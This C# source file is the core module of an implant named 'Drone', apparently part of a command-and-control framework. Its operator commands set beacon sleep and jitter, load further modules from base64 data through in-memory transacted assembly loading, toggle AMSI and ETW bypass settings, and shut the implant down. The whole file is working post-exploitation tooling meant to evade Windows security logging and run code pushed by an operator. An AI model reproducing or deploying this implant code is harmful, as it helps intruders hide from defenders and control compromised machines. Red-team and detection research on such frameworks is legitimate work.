using System;
using System.Collections.Generic;
using System.Threading;

using Drone.Models;

namespace Drone.Modules
{
    public class CoreModule : DroneModule
    {
        public override string Name => "core";

        public override List<Command> Commands => new List<Command>
        {
            new ("sleep", "Set sleep interval and jitter", SetSleep, new List<Command.Argument>
            {
                new ("interval", false),
                new ("jitter")
            }),
            new ("load-module", "Load an external Drone module", LoadModule, new List<Command.Argument>
            {
                new ("/path/to/module.dll", false, true)
            }),
            new ("bypass", "Set a directive to bypass AMSI/ETW on tasks", SetBypass, new List<Command.Argument>
            {
                new("amsi/etw", false),
                new("true/false")
            }),
            new ("exit", "Exit this Drone", ExitDrone)
        };

        private void SetSleep(DroneTask task, CancellationToken token)
        {
            Config.SetConfig("SleepInterval", Convert.ToInt32(task.Arguments[0]));
            
            if (task.Arguments.Length > 1)
                Config.SetConfig("SleepJitter", Convert.ToInt32(task.Arguments[1]));
        }

        private void LoadModule(DroneTask task, CancellationToken token)
        {
            var bytes = Convert.FromBase64String(task.Artefact);
            var transact = new TransactedAssembly();
            var asm = transact.Load(bytes);
            
            Drone.LoadDroneModule(asm);
        }

        private void SetBypass(DroneTask task, CancellationToken token)
        {
            var config = "";

            if (task.Arguments[0].Equals("amsi", StringComparison.OrdinalIgnoreCase))
                config = "BypassAmsi";

            if (task.Arguments[0].Equals("etw", StringComparison.OrdinalIgnoreCase))
                config = "BypassEtw";

            if (string.IsNullOrEmpty(config))
            {
                Drone.SendError(task.TaskGuid, "Not a valid configuration option");
                return;
            }

            var current = Config.GetConfig<bool>(config);

            if (task.Arguments.Length == 2)
            {
                if (!bool.TryParse(task.Arguments[1], out var enabled))
                {
                    Drone.SendError(task.TaskGuid, $"{task.Arguments[1]} is not a value bool");
                    return;
                }

                Config.SetConfig(config, enabled);
                current = Config.GetConfig<bool>(config);
            }

            Drone.SendResult(task.TaskGuid, $"{config} is {current}");
        }

        private void ExitDrone(DroneTask task, CancellationToken token)
        {
            Drone.Stop();
        }
    }
}